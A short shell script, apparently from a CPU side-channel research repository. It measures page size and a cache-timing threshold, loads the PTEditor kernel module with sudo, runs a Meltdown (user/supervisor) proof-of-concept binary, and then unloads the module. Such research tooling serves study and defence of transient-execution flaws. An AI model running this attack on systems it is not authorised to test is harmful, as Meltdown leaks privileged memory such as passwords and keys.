pagesize=`./libcache/get_pagesize`
threshold=`./libcache/get_threshold`
echo "pagesize = $pagesize, threshold = $threshold"
sudo insmod libpte/module/pteditor.ko
./meltdown/US/poc $pagesize $threshold
sudo rmmod libpte/module/pteditor.ko